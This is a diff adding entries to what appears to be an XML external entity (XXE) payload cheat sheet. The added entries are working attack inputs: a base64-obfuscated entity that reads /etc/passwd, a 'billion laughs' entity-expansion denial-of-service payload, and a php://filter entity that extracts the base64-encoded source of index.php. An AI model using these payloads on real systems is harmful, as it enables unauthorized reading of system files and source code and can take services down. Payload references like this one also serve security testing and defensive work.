@@ -50,3 +50,36 @@
 <Content>test</Content>
 </test>
 ```
+
+### Base64 Encoded
+
+```xml
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+```
+
+### Billion Laugh Attack
+```
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+```
+
+### PHP Wrapper
+```
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <address>42 rue du CTF</address>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+```
+
